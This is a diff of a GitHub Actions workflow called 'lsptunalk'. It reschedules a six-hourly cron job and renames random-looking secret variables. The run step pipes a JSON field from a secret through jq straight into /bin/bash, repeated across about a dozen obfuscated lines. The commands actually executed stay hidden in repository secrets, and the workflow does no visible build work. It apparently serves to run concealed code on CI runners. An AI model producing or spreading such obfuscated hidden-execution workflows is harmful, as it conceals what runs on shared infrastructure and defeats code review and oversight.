@@ -3,28 +3,26 @@ name: lsptunalk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 0/6 * * *'
+    - cron: '23 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lsptunalk
         env:
-          bju08378: ${{ secrets.bju08378 }}
+          w76749: ${{ secrets.w76749 }}
         run: |
-          echo $bju08378 | jq -r .t5 | /bin/bash
-          echo $aqf692 | jq -r .cpr69271 | /bin/bash
-          echo $f60941 | jq -r .jl0440 | /bin/bash
-          echo $hx4 | jq -r .aiwzo6 | /bin/bash
-          echo $a7 | jq -r .hb786 | /bin/bash
-          echo $ddfdu405 | jq -r .cnr98095 | /bin/bash
-          echo $stxe59 | jq -r .hn67150 | /bin/bash
-          echo $wfs930 | jq -r .nag84 | /bin/bash
-          echo $lcrsu06845 | jq -r .xexnn5581 | /bin/bash
-          echo $cwzs6 | jq -r .ir68637 | /bin/bash
-          echo $li618 | jq -r .onnvu7 | /bin/bash
-          echo $i27375 | jq -r .qqoak2 | /bin/bash
+          echo $w76749 | jq -r .rjgr16 | /bin/bash
+          echo $hpy160 | jq -r .hvdu14466 | /bin/bash
+          echo $ykmi63320 | jq -r .cw66 | /bin/bash
+          echo $ohqf8 | jq -r .fwr9440 | /bin/bash
+          echo $doutw4562 | jq -r .chzk88145 | /bin/bash
+          echo $fcbp3 | jq -r .fjr6774 | /bin/bash
+          echo $v747 | jq -r .bbj13778 | /bin/bash
+          echo $bg451 | jq -r .rhy30049 | /bin/bash
+          echo $zbmo9611 | jq -r .ixvn69760 | /bin/bash
+          echo $b69995 | jq -r .oc40 | /bin/bash
+          echo $bgszv81 | jq -r .v02 | /bin/bash
 
